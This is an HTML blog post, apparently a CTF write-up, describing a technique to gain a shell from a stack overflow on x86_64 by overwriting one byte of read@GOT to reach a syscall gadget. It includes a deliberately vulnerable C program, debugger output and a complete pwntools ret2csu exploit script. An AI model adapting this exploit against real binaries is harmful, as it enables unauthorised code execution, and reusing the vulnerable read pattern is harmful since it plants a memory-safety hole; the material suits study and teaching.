@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  From read@GLIBC to RCE in X86_64 · AMRIUNIX
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Oussama Amri">
+<meta name="description" content="New technique for Arbitrary Code Execution only by using the `read` function from libc.">
+<meta name="keywords" content="infosec,cybersecuirty,web3,blockchain,security">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="From read@GLIBC to RCE in X86_64">
+  <meta name="twitter:description" content="New technique for Arbitrary Code Execution only by using the `read` function from libc.">
+
+<meta property="og:url" content="http://localhost:1313/posts/from-read-glibc-to-rce-x86_64/">
+  <meta property="og:site_name" content="AMRIUNIX">
+  <meta property="og:title" content="From read@GLIBC to RCE in X86_64">
+  <meta property="og:description" content="New technique for Arbitrary Code Execution only by using the `read` function from libc.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2019-11-29T17:03:16+01:00">
+    <meta property="article:modified_time" content="2019-11-29T17:03:16+01:00">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Exploit">
+    <meta property="article:tag" content="Rce">
+    <meta property="article:tag" content="Buffer-Overflow">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/from-read-glibc-to-rce-x86_64/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      AMRIUNIX
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/from-read-glibc-to-rce-x86_64/">
+              From read@GLIBC to RCE in X86_64
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2019-11-29T17:03:16&#43;01:00">
+                November 29, 2019
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          
+          
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/exploit/">Exploit</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/rce/">Rce</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/buffer-overflow/">Buffer-Overflow</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <p>While playing some pwn in <strong>HackZone</strong> CTF, i figured out a new technique for Arbitrary Code Execution only by using the <code>read</code> function from libc.</p>
+<h2 id="tldr">
+  TL;DR
+  <a class="heading-link" href="#tldr">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>It&rsquo;s almost impossible for a security research to exploit a binary only with Arbitrary Write, because in real world you need to leak some data (Specially when ASLR is enabled) and then jump to the right place. However i got an idea of how to get RCE using only read@GLIBC (<code>Arbitrary Write</code>) on a X86_64 platform.</p>
+<h2 id="pwnc">
+  PWN.c
+  <a class="heading-link" href="#pwnc">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">// gcc -fno-stack-protector -no-pie pwn.c -o pwn
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">main</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> buf[<span style="color:#a5d6ff">100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">read</span>(<span style="color:#a5d6ff">0</span>, <span style="color:#ff7b72;font-weight:bold">&amp;</span>buf, <span style="color:#a5d6ff">500</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Following this code, we will be compiling it and try to exploit it using our method!</p>
+<pre tabindex="0"><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>As we can see the GOT table is writable, so this will help us to overwrite the read@GOT but the problem is what kind of data we&rsquo;ll using it to overwrite the read@GOT since we don&rsquo;t have the ability to leak address and ASLR is enable!</p>
+<h2 id="readgot">
+  Read@GOT
+  <a class="heading-link" href="#readgot">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# objdump -R ./pwn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>./pwn:     file format elf64-x86-64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DYNAMIC RELOCATION RECORDS
+</span></span><span style="display:flex;"><span>OFFSET           TYPE              VALUE 
+</span></span><span style="display:flex;"><span>0000000000403ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>0000000000403ff8 R_X86_64_GLOB_DAT  __gmon_start__
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">0000000000404018</span> R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gdb-peda$ x/g 0x404018
+</span></span><span style="display:flex;"><span>0x404018 &lt;read@got.plt&gt;:        0x00007ffff7ee2850
+</span></span></code></pre></div><p>In our example the address <code>0x404018</code> in the GOT table points to the address of <code>read@GLIBC_2.2.5</code> in libc.</p>
+<h2 id="readglibc">
+  Read@GLIBC
+  <a class="heading-link" href="#readglibc">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">gdb</span><span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#79c0ff">peda$</span> di<span style="color:#79c0ff">sassemble</span> <span style="color:#79c0ff">read</span> 
+</span></span><span style="display:flex;"><span><span style="color:#d2a8ff;font-weight:bold">Dump</span> <span style="color:#79c0ff">of</span> <span style="color:#79c0ff">assembler</span> <span style="color:#79c0ff">code</span> <span style="color:#79c0ff">for</span> <span style="color:#79c0ff">function</span> <span style="color:#79c0ff">__GI___libc_read</span>:
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2850</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">0</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:     <span style="color:#79c0ff">lea</span>    rax,[<span style="color:#79c0ff">rip</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0xd3b79</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2857</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">7</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:     <span style="color:#79c0ff">mov</span>    eax,<span style="color:#ff7b72">DWORD</span> <span style="color:#79c0ff">PTR</span> [rax]
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2859</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">9</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:     <span style="color:#79c0ff">test</span>   eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee285b</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">11</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">jne</span>    <span style="color:#a5d6ff">0x7ffff7ee2870</span> <span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#79c0ff">__GI___libc_read</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">32</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee285d</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">13</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">xor</span>    eax,eax
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee285f</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">15</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">syscall</span> 
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2861</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">17</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">cmp</span>    rax,<span style="color:#a5d6ff">0xfffffffffffff000</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2867</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">23</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">ja</span>     <span style="color:#a5d6ff">0x7ffff7ee28c0</span> <span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#79c0ff">__GI___libc_read</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">112</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2869</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">25</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">ret</span>    
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee286a</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">26</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">nop</span>    <span style="color:#ff7b72">WORD</span> <span style="color:#79c0ff">PTR</span> [rax<span style="color:#ff7b72;font-weight:bold">+</span>rax<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">1</span><span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x0</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2870</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">32</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">sub</span>    rsp,<span style="color:#a5d6ff">0x28</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2874</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">36</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">mov</span>    <span style="color:#ff7b72">QWORD</span> <span style="color:#79c0ff">PTR</span> [rsp<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x18</span>],rdx
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2879</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">41</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">mov</span>    <span style="color:#ff7b72">QWORD</span> <span style="color:#79c0ff">PTR</span> [rsp<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x10</span>],rsi
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee287e</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">46</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">mov</span>    <span style="color:#ff7b72">DWORD</span> <span style="color:#79c0ff">PTR</span> [rsp<span style="color:#ff7b72;font-weight:bold">+</span><span style="color:#a5d6ff">0x8</span>],edi
+</span></span><span style="display:flex;"><span>   <span style="color:#f85149">0</span><span style="color:#d2a8ff;font-weight:bold">x00007ffff7ee2882</span> <span style="color:#ff7b72;font-weight:bold">&lt;+</span><span style="color:#a5d6ff">50</span><span style="color:#ff7b72;font-weight:bold">&gt;</span>:    <span style="color:#79c0ff">call</span>   <span style="color:#a5d6ff">0x7ffff7efe570</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#d2a8ff;font-weight:bold">...</span>
+</span></span></code></pre></div><p>Following the assembler code for function <strong>read@GLIBC</strong>, we can see that the first <code>syscall</code> instruction is only 15bit from the first instruction followed by <code>ret</code> which is only 45bit from the first instruction.</p>
+<blockquote>
+<p>One byte overwrite in the read@GOT can create a gadget of <code>syscall; ret</code></p>
+</blockquote>
+<h2 id="summarize">
+  Summarize
+  <a class="heading-link" href="#summarize">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<figure><img src="/img/from-read-glibc-to-rce-x86_64/read_got.png">
+</figure>
+
+<h3 id="pwn">
+  PWN
+  <a class="heading-link" href="#pwn">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>To summarize all the steps to exploit the binary, what we need to do is :</p>
+<ol>
+<li>We need to use <code>ret2csu</code> technique in order to control the RDI, RSI and RDX.</li>
+<li>Using the read function to write <code>/bin/sh</code> in the <code>.bss</code> section.</li>
+<li>Overwrite the <code>read@GOT</code> with one byte <code>0x5f</code> in order for the read function to point in the <code>syscall</code> instruction.</li>
+<li>Because we overwrite with <code>one</code> byte, that&rsquo;s mean the <code>RAX</code> is equal to <code>1</code>.</li>
+<li>The RAX register is equal to 1 and the read function is pointing in syscall instruction. That&rsquo;s mean we have a <code>write</code> function.</li>
+<li>Using the write function, we will read <code>0x3b</code> size of arbitrary data from (.text or .bss) in order for the RAX to be equal to 0x3b (<code>sys_execve</code>).</li>
+<li>Now we have <code>RAX</code> equal to <code>0x3b</code> and we have <code>/bin/sh</code> in the memory, all what we need to do is to fire a <code>syscall</code>.</li>
+<li>We got a shell.</li>
+</ol>
+<h3 id="exploit">
+  Exploit
+  <a class="heading-link" href="#exploit">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff7b72;font-weight:bold">=</span> process(<span style="color:#a5d6ff">&#39;./pwn&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>read_got    <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x404018</span>) <span style="color:#8b949e;font-style:italic"># read@got</span>
+</span></span><span style="display:flex;"><span>read_plt    <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x401030</span>) <span style="color:#8b949e;font-style:italic"># read@plt</span>
+</span></span><span style="display:flex;"><span>str_bin_sh  <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x404100</span>) <span style="color:#8b949e;font-style:italic"># 0x00404000 (bss) + 0x100</span>
+</span></span><span style="display:flex;"><span>text        <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x401000</span>) <span style="color:#8b949e;font-style:italic"># .text section</span>
+</span></span><span style="display:flex;"><span>csu_init1   <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x4011a2</span>) <span style="color:#8b949e;font-style:italic"># pop rbx</span>
+</span></span><span style="display:flex;"><span>csu_init2   <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x401188</span>) <span style="color:#8b949e;font-style:italic"># mov rsi, r13</span>
+</span></span><span style="display:flex;"><span>csu_fini    <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x4011b0</span>) <span style="color:#8b949e;font-style:italic"># ret</span>
+</span></span><span style="display:flex;"><span>sys_execve  <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x3b</span>)
+</span></span><span style="display:flex;"><span>null        <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x0</span>)
+</span></span><span style="display:flex;"><span>one         <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x1</span>)
+</span></span><span style="display:flex;"><span>zero        <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x0</span>)
+</span></span><span style="display:flex;"><span>stdin       <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x0</span>)
+</span></span><span style="display:flex;"><span>stdout      <span style="color:#ff7b72;font-weight:bold">=</span> p64(<span style="color:#a5d6ff">0x1</span>)
+</span></span><span style="display:flex;"><span>junk        <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;JUNKJUNK&#39;</span>
+</span></span><span style="display:flex;"><span>bin_sh      <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;/bin/sh</span><span style="color:#79c0ff">\x00</span><span style="color:#a5d6ff">&#39;</span>
+</span></span><span style="display:flex;"><span>len_bin_sh  <span style="color:#ff7b72;font-weight:bold">=</span> p64(len(bin_sh))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">def</span> <span style="color:#d2a8ff;font-weight:bold">ret2csu</span>(func_GOT, rdi, rsi, rdx):
+</span></span><span style="display:flex;"><span>    ret_csu  <span style="color:#ff7b72;font-weight:bold">=</span> zero      <span style="color:#8b949e;font-style:italic"># pop rbx</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> one       <span style="color:#8b949e;font-style:italic"># pop rbp</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> rdi       <span style="color:#8b949e;font-style:italic"># pop r12</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> rsi       <span style="color:#8b949e;font-style:italic"># pop r13</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> rdx  <span style="color:#8b949e;font-style:italic"># pop r14</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> func_GOT  <span style="color:#8b949e;font-style:italic"># pop r15</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> csu_init2 <span style="color:#8b949e;font-style:italic"># ret</span>
+</span></span><span style="display:flex;"><span>    ret_csu <span style="color:#ff7b72;font-weight:bold">+=</span> junk      <span style="color:#8b949e;font-style:italic"># add rsp,0x8</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> ret_csu
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>crash <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#39;A&#39;</span> <span style="color:#ff7b72;font-weight:bold">*</span> <span style="color:#a5d6ff">120</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Write &#39;/bin/sh&#39; in str_bin_sh</span>
+</span></span><span style="display:flex;"><span>rop  <span style="color:#ff7b72;font-weight:bold">=</span> csu_init1
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> ret2csu(read_got, stdin, str_bin_sh, len_bin_sh)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Overwrite read@got with one_byte</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> ret2csu(read_got, stdin, read_got, one)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># Read arbitrary data in order to gt 0x3b in RAX</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> ret2csu(read_got, stdout, text, sys_execve)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># sys_execve(&#39;/bin/sh&#39;)</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#ff7b72;font-weight:bold">+=</span> ret2csu(read_got, str_bin_sh, null, null)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> crash <span style="color:#ff7b72;font-weight:bold">+</span> rop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exploit <span style="color:#ff7b72;font-weight:bold">=</span> payload<span style="color:#ff7b72;font-weight:bold">.</span>ljust(<span style="color:#a5d6ff">500</span>, <span style="color:#a5d6ff">&#39;A&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>send(exploit)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>send(bin_sh)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>send(<span style="color:#a5d6ff">&#39;</span><span style="color:#79c0ff">\x5f</span><span style="color:#a5d6ff">&#39;</span>)
+</span></span><span style="display:flex;"><span>garbage <span style="color:#ff7b72;font-weight:bold">=</span> p<span style="color:#ff7b72;font-weight:bold">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><h3 id="download">
+  Download
+  <a class="heading-link" href="#download">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<ul>
+<li><a href="/files/from-read-glibc-to-rce-x86_64/read_glibc.zip" >read_glibc.zip</a>
+<!-- raw HTML omitted --></li>
+</ul>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        <div id="disqus_thread"></div>
+<script>
+  window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "amriunix" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    
+    document.addEventListener('themeChanged', function (e) { 
+        if (document.readyState == 'complete') {
+          DISQUS.reset({ reload: true, config: disqus_config });
+        }
+    });
+</script>
+        
+        
+        
+        
+
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2024
+     Oussama Amri 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-1NCNEQNX2H"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-1NCNEQNX2H');
+        }
+      </script>
+    
+  
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
